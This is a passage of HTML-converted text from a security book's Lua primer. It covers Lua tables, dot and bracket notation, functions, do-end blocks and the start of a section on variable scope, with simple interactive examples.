style="margin-top:0.0000pt;margin-right:331.9500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table.bar) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >baz</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table.bar =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"foo"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:310.4000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table["bar"]) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >foo</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table["xxx"] =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"yyy"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:331.9500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table.xxx) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yyy</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.6000pt;margin-right:11.1500pt;" ><a name="_bookmark611" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you can see from the previous output, a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >table </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is a key value data structure and is defined using the same </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >{} </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as the array example earlier. The difference is that instead of just defining values at a number index, you assign/create unique keys for each value. You then reference those values by using the keys either in between </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >brackets or by using the dot notation, such as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table .foo</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which is demonstrated in the previous script. Notice that you can also just</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section323" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >create an empty table and then assign the key value pairs, as demonstrated in the following code:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:12.0500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >{}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table["foo"] =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"bar"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table.bar =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"baz"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:331.9500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table.foo) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >bar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:310.4000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >print(t_table["bar"]) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >baz</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="194"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker402139.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:8.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Functions and Blocks</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lua does not use brackets to delimit a chunk of code like an </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statement or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >while </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop, but instead uses the word </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to start the block, and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to close it. This might be familiar to you depending on what programming languages you have used. Some chunks, like functions, do not need an explicit statement to open but should still be ended by </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The following shows the creation of a function called </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >testfunction</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and then the creating of a simple block:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:11.9000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >testfunction(var1)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; print(var1)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:324.7500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >testfunction("foo") </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >foo</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; a =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; b =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:403.9000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.1500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >print(a) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:403.9000pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.1500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >print(b) </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section324" ><p class=MsoNormal  style="margin-top:3.6000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.4500pt;" ><a name="_bookmark612" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Where Lua differs from most other languages is in the default scope of a variable. Normally, if you define a variable inside a function, for example, the scope is lobcal to that function. This means that it is okay to use the same variable name in a different function, and they could contain different values. If you want to access the same variable in different contexts, it has to be scoped globally, usually by prefixing the variable with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >global</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In Lua, it is the other way around. Variables in Lua are global by default, although you can change this by prefixing the variable with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >on its first use. Using global variables affects performance, and in general, developers consider the use of global variables when locals would suffice to be sloppy programming, so it is good practice to use local variables wherever possible. Try the following example in an interactive Lua shell to get a feel for variable scoping in Lua, but remember to wrap it inside a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do-end </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >block, as mentioned earlier:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:11.6000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >a()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local vara =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p 